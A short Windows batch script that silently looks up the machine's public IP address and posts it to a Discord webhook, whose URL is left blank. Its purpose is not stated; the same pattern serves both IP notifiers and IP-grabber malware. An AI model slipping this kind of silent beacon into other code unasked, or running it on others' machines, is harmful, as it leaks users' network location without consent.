@echo off
setlocal enabledelayedexpansion

set "MY_WEBHOOK="

call :SendIPToDiscord "%MY_WEBHOOK%"

exit /b


:SendIPToDiscord
set "WEBHOOK_URL=%~1"
for /f "delims=" %%a in ('curl -s https://api.ipify.org') do set "PUBLIC_IP=%%a"
echo {"content": "!PUBLIC_IP!"}> discord_payload.txt
curl -s -X POST -H "Content-Type: application/json" -d @discord_payload.txt "%WEBHOOK_URL%"
if exist discord_payload.txt del discord_payload.txt
goto :eof